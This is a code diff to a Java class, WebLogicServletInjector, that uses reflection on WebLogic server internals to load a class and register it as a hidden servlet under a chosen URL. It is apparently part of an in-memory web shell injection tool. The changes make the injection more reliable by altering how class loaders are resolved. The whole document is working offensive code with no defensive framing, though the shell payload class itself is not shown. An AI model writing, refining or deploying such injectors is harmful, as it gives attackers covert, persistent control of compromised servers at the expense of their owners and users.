@@ -134,12 +134,17 @@ public class WebLogicServletInjector {
         return webappContexts.toArray();
     }
 
+    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "classLoader"));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -158,8 +163,9 @@ public class WebLogicServletInjector {
     public void inject(Object context, Object servlet) throws Exception {
         // weblogic.servlet.utils.URLMapping
         Object servletMapping = invokeMethod(context, "getServletMapping", null, null);
-        Class<?> webAppServletContextClass = Class.forName("weblogic.servlet.internal.WebAppServletContext");
-        Class<?> servletStubImplClass = Class.forName("weblogic.servlet.internal.ServletStubImpl");
+        Class<?> webAppServletContextClass = context.getClass();
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
+        Class<?> servletStubImplClass = contextClassLoader.loadClass("weblogic.servlet.internal.ServletStubImpl");
         Object servletStub = null;
         Constructor<?> servletStubImplConstructor = null;
         try {
@@ -172,7 +178,7 @@ public class WebLogicServletInjector {
             servletStubImplConstructor.setAccessible(true);
             servletStub = servletStubImplConstructor.newInstance(getClassName(), getClassName(), context, null);
         }
-        Constructor<?> urlMatchHelperConstructor = Class.forName("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, servletStubImplClass);
+        Constructor<?> urlMatchHelperConstructor = contextClassLoader.loadClass("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, servletStubImplClass);
         urlMatchHelperConstructor.setAccessible(true);
         Object urlMatchHelper = urlMatchHelperConstructor.newInstance(getUrlPattern(), servletStub);
         Object mapping = invokeMethod(servletMapping, "get", new Class[]{String.class}, new Object[]{getUrlPattern()});
